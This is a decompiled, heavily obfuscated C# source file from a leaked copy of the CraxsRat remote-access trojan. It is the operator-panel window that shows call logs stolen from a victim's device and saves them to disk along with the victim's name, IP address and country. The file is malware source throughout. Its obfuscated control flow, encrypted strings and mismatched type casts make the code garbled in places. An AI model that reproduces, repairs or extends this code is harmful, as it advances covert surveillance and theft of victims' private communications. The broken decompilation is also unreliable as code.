// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.craxscallslog
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class craxscallslog : Form
  {
    private string armsg;
    private string cnmsg;
    private IContainer components;

    [field: AccessedThroughProperty("callstext")]
    internal virtual TextBox callstext { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Panel1")]
    internal virtual Panel Panel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
    {
      get => this._DrakeUIButtonIcon2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon2_Click);
        DrakeUIButtonIcon drakeUiButtonIcon2 = this._DrakeUIButtonIcon2;
label_1:
        int num1 = -860560071;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) -(-1647984091 - -(-num2 + (499057150 ^ -1845432165 ^ 18983011 * -251143285 * -562263167) + (~(-1718419025 ^ -689990647) + (374033011 + 586258031 - ~-1503778012))))) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              int num4 = drakeUiButtonIcon2 == null ? -348296034 : (num4 = -435694476);
              num1 = num4 ^ (int) num3 * -1045621764;
              continue;
            case 2:
              int num5 = drakeUiButtonIcon2 == null ? -553738000 : (num5 = 235885836);
              num1 = num5 ^ (int) num3 * 40835483;
              continue;
            case 3:
              drakeUiButtonIcon2.Click -= eventHandler;
              num1 = (int) num3 * 122334512 ^ 1417954382;
              continue;
            case 4:
              this._DrakeUIButtonIcon2 = value;
              drakeUiButtonIcon2 = this._DrakeUIButtonIcon2;
              num1 = -1167562220;
              continue;
            case 5:
              goto label_1;
            case 6:
              drakeUiButtonIcon2.Click += eventHandler;
              num1 = (int) num3 * -1620952576 ^ 257285433;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    [field: AccessedThroughProperty("ToolTips")]
    internal virtual DrakeUIToolTip ToolTips { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
    {
      get => ((CraxsMsgbox) this)._DrakeUIButtonIcon1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon1_Click);
label_1:
        int num1 = 1191337624;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DrakeUIButtonIcon drakeUiButtonIcon1;
          switch ((num3 = (uint) (36670554 - ~(-(((-1722504780 - 1079154022) * -958342949 ^ 1493219443 * -1167948891 + ~1893119578) * -932787061 - ~num2) * -271148659))) % 8U)
          {
            case 0:
              goto label_3;
            case 1:
              ((CraxsMsgbox) this)._DrakeUIButtonIcon1 = value;
              drakeUiButtonIcon1 = ((CraxsMsgbox) this)._DrakeUIButtonIcon1;
              num1 = 51574219;
              continue;
            case 2:
              drakeUiButtonIcon1.Click += eventHandler;
              num1 = (int) num3 * 109415704 ^ -761320596;
              continue;
            case 3:
              goto label_1;
            case 4:
              drakeUiButtonIcon1 = ((CraxsMsgbox) this)._DrakeUIButtonIcon1;
              num1 = (int) num3 * -981984372 ^ 1851550857;
              continue;
            case 5:
              int num4 = drakeUiButtonIcon1 == null ? 1284415424 : (num4 = -573209762);
              num1 = num4 ^ (int) num3 * -1275626804;
              continue;
            case 6:
              drakeUiButtonIcon1.Click -= eventHandler;
              num1 = (int) num3 * -1959073585 ^ 839532749;
              continue;
            case 7:
              int num5 = drakeUiButtonIcon1 == null ? 1379470584 : (num5 = 929974033);
              num1 = num5 ^ (int) num3 * -1533540887;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual DrakeUIButtonIcon checkbutton
    {
      get => ((CraxsMsgbox) this)._checkbutton;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Checkbutton_Click);
label_1:
        int num1 = -1103074774;
        DrakeUIButtonIcon checkbutton;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(num1 * 1053016439) * 987725251)) % 8U)
          {
            case 0:
              int num3 = checkbutton == null ? 1148841387 : (num3 = 435715153);
              num1 = num3 ^ (int) num2 * -1626898440;
              continue;
            case 1:
              goto label_3;
            case 2:
              checkbutton = ((CraxsMsgbox) this)._checkbutton;
              num1 = (int) num2 * 1229902797 ^ -1662014702;
              continue;
            case 3:
              checkbutton.Click += eventHandler;
              num1 = (int) num2 * -1683993062 ^ -710574667;
              continue;
            case 4:
              goto label_1;
            case 5:
              checkbutton.Click -= eventHandler;
              num1 = (int) num2 * -312749708 ^ 845817937;
              continue;
            case 6:
              checkbutton = ((CraxsMsgbox) this)._checkbutton;
              int num4 = checkbutton == null ? -1965037479 : (num4 = 1402542675);
              num1 = num4 ^ (int) num2 * 52299018;
              continue;
            case 7:
              ((CraxsMsgbox) this)._checkbutton = value;
              num1 = -1078768418;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Panel Panel5
    {
      get => ((CraxsMsgbox) this)._Panel5;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CraxsMsgbox) this)._Panel5 = value;
    }

    internal virtual Panel Panel4
    {
      get => ((CraxsMsgbox) this)._Panel4;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CraxsMsgbox) this)._Panel4 = value;
    }

    internal virtual Panel Panel3
    {
      get => ((CraxsMsgbox) this)._Panel3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CraxsMsgbox) this)._Panel3 = value;
    }

    internal virtual Panel Panel2
    {
      get => ((CraxsMsgbox) this)._Panel2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((CraxsMsgbox) this)._Panel2 = value;
    }

    public craxscallslog()
    {
      this.Load += new EventHandler(this.Craxscallslog_Load);
      this.Deactivate += new EventHandler(this.Craxscallslog_Deactivate);
      ((comptableform) this).InitializeComponent();
    }

    private void Craxscallslog_Load(object sender, EventArgs e)
    {
      Point position = Cursor.Position;
      int x = checked (position.X - 79);
      position = Cursor.Position;
      int y = position.Y;
      this.Location = new Point(x, y);
      this.BackColor = Color.DarkRed;
      this.TransparencyKey = Color.DarkRed;
      try
      {
        if (((CraxsMsgbox) this).ClassClient == null)
          goto label_22;
label_2:
        int num1 = 483825253;
label_3:
        string[] calls;
        int index;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (((num1 ^ ~((-130315158 * 1486721309 ^ -431160895 - 229956363) + (831922766 - 1922452573 - 1932310108 * 1784607729)) + 1465526805 * (-(-1043573473 * 454727057) ^ ~(193212300 + 593226773))) * -1361470673 + (1650047025 * (463953693 - 492984189) + (935007795 - -265895223 + --1905250178)) ^ ~-1731635387) - ~-539922783 ^ -1057899242)) % 6U)
          {
            case 0:
              // ISSUE: reference to a compiler-generated field
              calls = ((Data._Closure\u0024__39\u002D15) ((CraxsMsgbox) this).ClassClient).CALLS;
              index = 0;
              num1 = (int) num2 * 66649646 ^ -1478110050;
              continue;
            case 1:
              goto label_7;
            case 3:
              goto label_2;
            case 4:
              // ISSUE: reference to a compiler-generated field
              if (((IEnumerable<string>) ((Data._Closure\u0024__39\u002D15) ((CraxsMsgbox) this).ClassClient).CALLS).Count<string>() > 0)
              {
                num1 = (int) num2 * 1640768196 ^ -1166928138;
                continue;
              }
              goto label_23;
            case 5:
              this.callstext.Text = EXGuarder.\u003451C5422;
              num1 = (int) num2 * -1691357910 ^ -1200788125;
              continue;
            default:
              goto label_10;
          }
        }
label_10:
        string str1 = calls[index];
        try
        {
          if (str1 != null)
          {
label_12:
            int num3 = 111121097;
            while (true)
            {
              uint num4;
              switch ((num4 = (uint) (((num3 ^ ~((-130315158 * 1486721309 ^ -431160895 - 229956363) + (831922766 - 1922452573 - 1932310108 * 1784607729)) + 1465526805 * (-(-1043573473 * 454727057) ^ ~(193212300 + 593226773))) * -1361470673 + (1650047025 * (463953693 - 492984189) + (935007795 - -265895223 + --1905250178)) ^ ~-1731635387) - ~-539922783 ^ -1057899242)) % 4U)
              {
                case 1:
                  TextBox callstext;
                  string str2 = (callstext = this.callstext).Text + str1 + EXGuarder.\u003783E4C26;
                  callstext.Text = str2;
                  num3 = (int) num4 * 2040776927 ^ -551509280;
                  continue;
                case 2:
                  int num5 = str1.Length <= 0 ? -1634002271 : (num5 = -1002672966);
                  num3 = num5 ^ (int) num4 * 92908451;
                  continue;
                case 3:
                  goto label_12;
                default:
                  goto label_17;
              }
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
label_17:
        checked { ++index; }
        goto label_18;
label_7:
        if (index < calls.Length)
        {
          num1 = 953259715;
          goto label_3;
        }
        else
          goto label_22;
label_18:
        int num6 = -1508411853;
label_19:
        uint num7;
        switch ((num7 = (uint) (((num6 ^ ~((-130315158 * 1486721309 ^ -431160895 - 229956363) + (831922766 - 1922452573 - 1932310108 * 1784607729)) + 1465526805 * (-(-1043573473 * 454727057) ^ ~(193212300 + 593226773))) * -1361470673 + (1650047025 * (463953693 - 492984189) + (935007795 - -265895223 + --1905250178)) ^ ~-1731635387) - ~-539922783 ^ -1057899242)) % 5U)
        {
          case 0:
            goto label_18;
          case 1:
            goto label_7;
          case 2:
            return;
          case 3:
            goto label_23;
          case 4:
            break;
          default:
            return;
        }
label_22:
        // ISSUE: reference to a compiler-generated field
        ((Data._Closure\u0024__39\u002D16) ((CraxsMsgbox) this).ClassClient).isnewcall = false;
        num6 = -548064639;
        goto label_19;
label_23:
        this.callstext.Text = EXGuarder.\u0035858743F;
        num6 = -865109355;
        goto label_19;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Checkbutton_Click(object sender, EventArgs e)
    {
      this.callstext.Text = EXGuarder.\u003051B7907;
label_1:
      int num1 = -1259956667;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((num1 * -1501700603 - (-~-607510563 - 386870965 - (306676831 + 336877529 * (2100532147 * 335650553)))) * 1461242763 - (~-129267855 - (705339811 - 545623780)) - 312229145 * 585969418 - 380902364)) % 4U)
        {
          case 0:
            this.Close();
            num1 = (int) num2 * -503466122 ^ 782353547;
            continue;
          case 1:
            // ISSUE: reference to a compiler-generated field
            ((Data._Closure\u0024__39\u002D15) ((CraxsMsgbox) this).ClassClient).CALLS = new string[251];
            num1 = (int) num2 * 1950284994 ^ 1317054716;
            continue;
          case 2:
            goto label_1;
          case 3:
            goto label_3;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    private void DrakeUIButtonIcon2_Click(object sender, EventArgs e) => this.Close();

    private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
    {
      if (string.IsNullOrEmpty(this.callstext.Text))
      {
        CraxsAlert.Showinformation(EXGuarder.\u0036B66532A);
      }
      else
      {
        try
        {
          // ISSUE: reference to a compiler-generated field
          if (Directory.Exists(((Data._Closure\u0024__39\u002D12) ((CraxsMsgbox) this).ClassClient).FolderUSER + EXGuarder.\u003182C4241))
            goto label_6;
label_3:
          int num1 = 1365926905;
label_4:
          string str;
          while (true)
          {
            uint num2;
            switch ((num2 = (uint) (~-(num1 - -(~~1226491242 + ~(-1755959206 * 1072018999) + ~(841454683 - (1376774603 - 1050205405))) - (-(1943282363 * ~1267660962) ^ -(-538303629 - -802572046))) * -842091129 - -1386719382)) % 8U)
            {
              case 0:
                // ISSUE: reference to a compiler-generated field
                int num3 = File.Exists(((Data._Closure\u0024__39\u002D12) ((CraxsMsgbox) this).ClassClient).FolderUSER + EXGuarder.\u0037524334E + str) ? -1373681966 : (num3 = 1622640116);
                num1 = num3 ^ (int) num2 * 584780487;
                continue;
              case 1:
                goto label_6;
              case 2:
                goto label_12;
              case 3:
                goto label_3;
              case 4:
                // ISSUE: reference to a compiler-generated field
                File.Create(((Data._Closure\u0024__39\u002D12) ((CraxsMsgbox) this).ClassClient).FolderUSER + EXGuarder.\u0037524334E + str).Dispose();
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                File.AppendAllText(((Data._Closure\u0024__39\u002D12) ((CraxsMsgbox) this).ClassClient).FolderUSER + EXGuarder.\u0037524334E + str, EXGuarder.\u0030A611F1D + ((Data._Closure\u0024__39\u002D12) ((CraxsMsgbox) this).ClassClient).ClientName + EXGuarder.\u0031E4B1B2F + ((Data) ((CraxsMsgbox) this).ClassClient).ClientAddressIP + EXGuarder.\u00332136A05 + ((Data._Closure\u0024__39\u002D11) ((CraxsMsgbox) this).ClassClient).Country + EXGuarder.\u0033A1D6C74 + DateTime.Now.ToString() + EXGuarder.\u00301313A70);
                num1 = (int) num2 * -2070173597 ^ -2032062138;
                continue;
              case 5:
                // ISSUE: reference to a compiler-generated field
                Process.Start(((Data._Closure\u0024__39\u002D12) ((CraxsMsgbox) this).ClassClient).FolderUSER + EXGuarder.\u003182C4241);
                num1 = (int) num2 * -802939247 ^ -1785712429;
                continue;
              case 6:
                // ISSUE: reference to a compiler-generated field
                File.AppendAllText(((Data._Closure\u0024__39\u002D12) ((CraxsMsgbox) this).ClassClient).FolderUSER + EXGuarder.\u0037524334E + str, str + this.callstext.Text + EXGuarder.\u003674C672D);
                num1 = 838282979;
                continue;
              case 7:
                // ISSUE: reference to a compiler-generated field
                Directory.CreateDirectory(((Data._Closure\u0024__39\u002D12) ((CraxsMsgbox) this).ClassClient).FolderUSER + EXGuarder.\u003182C4241);
                num1 = (int) num2 * 1174538575 ^ -1938503402;
                continue;
              default:
                goto label_13;
            }
          }
label_12:
          return;
label_13:
          return;
label_6:
          str = DateTime.Now.ToString(EXGuarder.\u003180D3D39) + EXGuarder.\u0035B176350;
          num1 = 1120884200;
          goto label_4;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    private void Craxscallslog_Deactivate(object sender, EventArgs e) => this.Close();

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing)
          return;
label_1:
        int num1 = -1249836321;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ~-(--(1674610947 + 1074180263 * (-384887357 ^ -611792490)) - num2)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              ((CraxsMsgbox) this).components.Dispose();
              num1 = (int) num3 * -1768617529 ^ -765468279;
              continue;
            case 2:
              int num4 = ((CraxsMsgbox) this).components == null ? 1400344 : (num4 = 860303138);
              num1 = num4 ^ (int) num3 * 1893913407;
              continue;
            case 3:
              goto label_3;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ((CraxsMsgbox) this).components = (IContainer) new System.ComponentModel.Container();
label_1:
      int num1 = -1358515566;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ~((-525095215 * -234057173 + 1824544919 - -num2 * 471002693 * 591924195) * 1315730749)) % 63U)
        {
          case 0:
            ((CraxsMsgbox) this).titletext.Padding = new Padding(0, 35, 0, 0);
            ((CraxsMsgbox) this).titletext.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 232429681 ^ -1811470671;
            continue;
          case 1:
            ((CraxsMsgbox) this).titletext.Margin = new Padding(4, 5, 4, 5);
            num1 = (int) num3 * -212013135 ^ 1796639145;
            continue;
          case 2:
            ((CraxsMsgbox) this).nobtn.Symbol = 61453;
            num1 = (int) num3 * 887834830 ^ 426011691;
            continue;
          case 3:
            ((CraxsMsgbox) this).Panel1.Dock = DockStyle.Bottom;
            num1 = (int) num3 * -54784943 ^ 1918699266;
            continue;
          case 4:
            ((CraxsMsgbox) this).msgtext.Size = new Size(627, 195);
            ((CraxsMsgbox) this).msgtext.TabIndex = 2;
            num1 = (int) num3 * -1155033743 ^ 1852558229;
            continue;
          case 5:
            ((CraxsMsgbox) this).okbtn.Size = new Size(87, 28);
            ((CraxsMsgbox) this).okbtn.Style = UIStyle.Custom;
            num1 = (int) num3 * 346114729 ^ 8503613;
            continue;
          case 6:
            ((CraxsMsgbox) this).picbox.Size = new Size(61, 195);
            ((CraxsMsgbox) this).picbox.SizeMode = PictureBoxSizeMode.Zoom;
            ((CraxsMsgbox) this).picbox.TabIndex = 3;
            ((CraxsMsgbox) this).picbox.TabStop = false;
            num1 = (int) num3 * -1257534499 ^ 242626600;
            continue;
          case 7:
            ((CraxsMsgbox) this).okbtn.TabIndex = 1;
            ((CraxsMsgbox) this).okbtn.Text = EXGuarder.\u0035345336C;
            num1 = (int) num3 * -268389824 ^ -1927522550;
            continue;
          case 8:
            ((CraxsMsgbox) this).titletext = new DrakeUITitlePanel();
            num1 = (int) num3 * -932707644 ^ 1685438381;
            continue;
          case 9:
            ((CraxsMsgbox) this).nobtn = new DrakeUIButtonIcon();
            num1 = (int) num3 * 1337569912 ^ -2120062662;
            continue;
          case 10:
            ((CraxsMsgbox) this).Panel1.TabIndex = 0;
            ((CraxsMsgbox) this).okbtn.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            ((CraxsMsgbox) this).okbtn.Cursor = Cursors.Hand;
            num1 = (int) num3 * 1214967354 ^ -149166939;
            continue;
          case 11:
            ((CraxsMsgbox) this).Panel1 = new Panel();
            ((CraxsMsgbox) this).okbtn = new DrakeUIButtonIcon();
            num1 = (int) num3 * 1913341397 ^ 91141538;
            continue;
          case 12:
            ((CraxsMsgbox) this).titletext.Location = new Point(0, 0);
            num1 = (int) num3 * 931127633 ^ -605011548;
            continue;
          case 14:
            ((CraxsMsgbox) this).okbtn.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((CraxsMsgbox) this).okbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * -762506393 ^ -1433741983;
            continue;
          case 15:
            ((CraxsMsgbox) this).titletext.Font = new Font(EXGuarder.\u003230B0157, 12f);
            ((CraxsMsgbox) this).titletext.ForeColor = Color.White;
            num1 = (int) num3 * 41983823 ^ 676134156;
            continue;
          case 16:
            ((CraxsMsgbox) this).okbtn.Name = EXGuarder.\u00352345366;
            num1 = (int) num3 * 688224382 ^ 1036633229;
            continue;
          case 17:
            ((CraxsMsgbox) this).nobtn.Style = UIStyle.Custom;
            num1 = (int) num3 * -470759493 ^ 1924509572;
            continue;
          case 18:
            ((CraxsMsgbox) this).okbtn.FillColor = Color.Black;
            num1 = (int) num3 * -1315818402 ^ -2101242088;
            continue;
          case 19:
            ((CraxsMsgbox) this).titletext.SuspendLayout();
            ((ISupportInitialize) ((CraxsMsgbox) this).picbox).BeginInit();
            num1 = (int) num3 * 1428546378 ^ -908328562;
            continue;
          case 20:
            ((CraxsMsgbox) this).titletext.Name = EXGuarder.\u0030B710921;
            num1 = (int) num3 * 1756607352 ^ -202088819;
            continue;
          case 21:
            ((CraxsMsgbox) this).Timer1 = new Timer(((CraxsMsgbox) this).components);
            ((CraxsMsgbox) this).Panel1.SuspendLayout();
            num1 = (int) num3 * -854860792 ^ -1018144954;
            continue;
          case 22:
            ((CraxsMsgbox) this).Panel2.Dock = DockStyle.Fill;
            num1 = (int) num3 * 1272575953 ^ -855245879;
            continue;
          case 23:
            ((CraxsMsgbox) this).Timer1.Interval = 500;
            num1 = (int) num3 * -660221875 ^ 623696790;
            continue;
          case 24:
            this.TopMost = true;
            ((CraxsMsgbox) this).Panel1.ResumeLayout(false);
            ((CraxsMsgbox) this).titletext.ResumeLayout(false);
            ((ISupportInitialize) ((CraxsMsgbox) this).picbox).EndInit();
            num1 = (int) num3 * 887731093 ^ 1385870129;
            continue;
          case 25:
            ((CraxsMsgbox) this).nobtn.Font = new Font(EXGuarder.\u003230B0157, 12f);
            num1 = (int) num3 * -1075469353 ^ -893152651;
            continue;
          case 26:
            ((CraxsMsgbox) this).picbox.Name = EXGuarder.\u00358455E1F;
            num1 = (int) num3 * -1277756181 ^ -101194557;
            continue;
          case 27:
            this.ClientSize = new Size(688, 269);
            this.ControlBox = false;
            this.Controls.Add((Control) ((CraxsMsgbox) this).Panel2);
            num1 = (int) num3 * -1326565310 ^ 209226912;
            continue;
          case 28:
            ((CraxsMsgbox) this).msgtext.Font = new Font(EXGuarder.\u003230B0157, 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * 904447977 ^ -461998294;
            continue;
          case 29:
            ((CraxsMsgbox) this).Panel2 = new Panel();
            num1 = (int) num3 * -1347166424 ^ 470298166;
            continue;
          case 30:
            goto label_1;
          case 31:
            ((CraxsMsgbox) this).msgtext.Location = new Point(61, 35);
            num1 = (int) num3 * -1159875395 ^ -887486220;
            continue;
          case 32:
            ((CraxsMsgbox) this).titletext.Controls.Add((Control) ((CraxsMsgbox) this).msgtext);
            num1 = (int) num3 * -1390876375 ^ 1974226085;
            continue;
          case 33:
            ((CraxsMsgbox) this).titletext.Style = UIStyle.Custom;
            num1 = (int) num3 * 362712297 ^ -286944903;
            continue;
          case 34:
            ((CraxsMsgbox) this).nobtn.TabIndex = 0;
            num1 = (int) num3 * -1179928001 ^ -29056333;
            continue;
          case 35:
            ((CraxsMsgbox) this).Panel1.Size = new Size(688, 39);
            num1 = (int) num3 * 1950798517 ^ 437536701;
            continue;
          case 36:
            ((CraxsMsgbox) this).titletext.FillColor = Color.FromArgb(225, 245, 254);
            num1 = (int) num3 * 886630502 ^ 345046796;
            continue;
          case 37:
            ((CraxsMsgbox) this).nobtn.Text = EXGuarder.\u003421A510D;
            ((CraxsMsgbox) this).msgtext.Dock = DockStyle.Fill;
            num1 = (int) num3 * 648941943 ^ -1222750860;
            continue;
          case 38:
            this.AutoScaleDimensions = new SizeF(8f, 16f);
            num1 = (int) num3 * -1704002922 ^ 86164013;
            continue;
          case 39:
            ((CraxsMsgbox) this).msgtext = new Label();
            num1 = (int) num3 * -939961699 ^ 848275074;
            continue;
          case 40:
            ((CraxsMsgbox) this).nobtn.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((CraxsMsgbox) this).nobtn.RectDisableColor = Color.FromArgb(227, 242, 253);
            ((CraxsMsgbox) this).nobtn.Size = new Size(87, 28);
            num1 = (int) num3 * 347356702 ^ -1606210028;
            continue;
          case 41:
            ((CraxsMsgbox) this).picbox = new PictureBox();
            num1 = (int) num3 * -101470072 ^ -18043338;
            continue;
          case 42:
            ((CraxsMsgbox) this).titletext.TabIndex = 3;
            num1 = (int) num3 * -2093713468 ^ -1242017572;
            continue;
          case 43:
            ((CraxsMsgbox) this).nobtn.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            ((CraxsMsgbox) this).nobtn.Cursor = Cursors.Hand;
            num1 = (int) num3 * -1208039292 ^ 1127981129;
            continue;
          case 44:
            this.ForeColor = Color.White;
            this.FormBorderStyle = FormBorderStyle.None;
            this.Name = EXGuarder.\u003425D6232;
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.StartPosition = FormStartPosition.CenterScreen;
            num1 = (int) num3 * -312873473 ^ -1143987163;
            continue;
          case 45:
            ((CraxsMsgbox) this).picbox.Dock = DockStyle.Left;
            ((CraxsMsgbox) this).picbox.Image = (Image) Craxs_Rat.My.Resources.Resources.warning48px;
            ((CraxsMsgbox) this).picbox.Location = new Point(0, 35);
            num1 = (int) num3 * -1629354388 ^ 471946577;
            continue;
          case 46:
            ((CraxsMsgbox) this).titletext.Controls.Add((Control) ((CraxsMsgbox) this).picbox);
            ((CraxsMsgbox) this).titletext.Dock = DockStyle.Fill;
            num1 = (int) num3 * -1901729129 ^ 780198888;
            continue;
          case 47:
            this.BackColor = Color.Black;
            num1 = (int) num3 * -926436186 ^ 2084787132;
            continue;
          case 48:
            ((CraxsMsgbox) this).msgtext.Text = EXGuarder.\u00329336860;
            ((CraxsMsgbox) this).msgtext.TextAlign = ContentAlignment.MiddleCenter;
            num1 = (int) num3 * -24812670 ^ 2001717661;
            continue;
          case 49:
            ((CraxsMsgbox) this).okbtn.Font = new Font(EXGuarder.\u003230B0157, 12f);
            ((CraxsMsgbox) this).okbtn.ForeColor = Color.Lime;
            ((CraxsMsgbox) this).okbtn.Location = new Point(589, 3);
            num1 = (int) num3 * -923347889 ^ -1830550558;
            continue;
          case 50:
            ((CraxsMsgbox) this).titletext.Size = new Size(688, 230);
            num1 = (int) num3 * -982751517 ^ 363917248;
            continue;
          case 51:
            ((CraxsMsgbox) this).nobtn.FillColor = Color.Black;
            num1 = (int) num3 * 473449852 ^ -394825698;
            continue;
          case 52:
            ((CraxsMsgbox) this).titletext.Text = EXGuarder.\u00332031722;
            ((CraxsMsgbox) this).titletext.TitleColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((CraxsMsgbox) this).picbox.BackColor = Color.Black;
            num1 = (int) num3 * -1048924459 ^ 237592286;
            continue;
          case 53:
            ((CraxsMsgbox) this).nobtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((CraxsMsgbox) this).nobtn.Location = new Point(487, 3);
            ((CraxsMsgbox) this).nobtn.Name = EXGuarder.\u003795D1B6F;
            num1 = (int) num3 * 2103136219 ^ 1541706730;
            continue;
          case 54:
            ((CraxsMsgbox) this).Panel2.SuspendLayout();
            num1 = (int) num3 * -900859362 ^ -1669117994;
            continue;
          case 55:
            this.AutoScaleMode = AutoScaleMode.Font;
            num1 = (int) num3 * 527910637 ^ 1899804332;
            continue;
          case 56:
            ((CraxsMsgbox) this).Panel2.Location = new Point(0, 0);
            num1 = (int) num3 * 1639448555 ^ -719886692;
            continue;
          case 57:
            ((CraxsMsgbox) this).msgtext.Name = EXGuarder.\u003480C4C1D;
            num1 = (int) num3 * 1715812380 ^ -105178902;
            continue;
          case 58:
            ((CraxsMsgbox) this).Panel2.Controls.Add((Control) ((CraxsMsgbox) this).titletext);
            ((CraxsMsgbox) this).Panel2.Controls.Add((Control) ((CraxsMsgbox) this).Panel1);
            num1 = (int) num3 * -1842948507 ^ 1375705963;
            continue;
          case 59:
            ((CraxsMsgbox) this).Panel1.Location = new Point(0, 230);
            ((CraxsMsgbox) this).Panel1.Name = EXGuarder.\u0035B293D5B;
            num1 = (int) num3 * 471710246 ^ -250342118;
            continue;
          case 60:
            ((CraxsMsgbox) this).Panel2.Name = EXGuarder.\u00355473874;
            ((CraxsMsgbox) this).Panel2.Size = new Size(688, 269);
            ((CraxsMsgbox) this).Panel2.TabIndex = 3;
            num1 = (int) num3 * -1294050667 ^ -2143584814;
            continue;
          case 61:
            this.Text = EXGuarder.\u003425D6232;
            num1 = (int) num3 * -1919554531 ^ -1708809071;
            continue;
          case 62:
            this.SuspendLayout();
            ((CraxsMsgbox) this).Panel1.Controls.Add((Control) ((CraxsMsgbox) this).okbtn);
            ((CraxsMsgbox) this).Panel1.Controls.Add((Control) ((CraxsMsgbox) this).nobtn);
            num1 = (int) num3 * -1366709490 ^ 1290183469;
            continue;
          default:
            goto label_64;
        }
      }
label_64:
      ((CraxsMsgbox) this).Panel2.ResumeLayout(false);
      this.ResumeLayout(false);
    }
  }
}
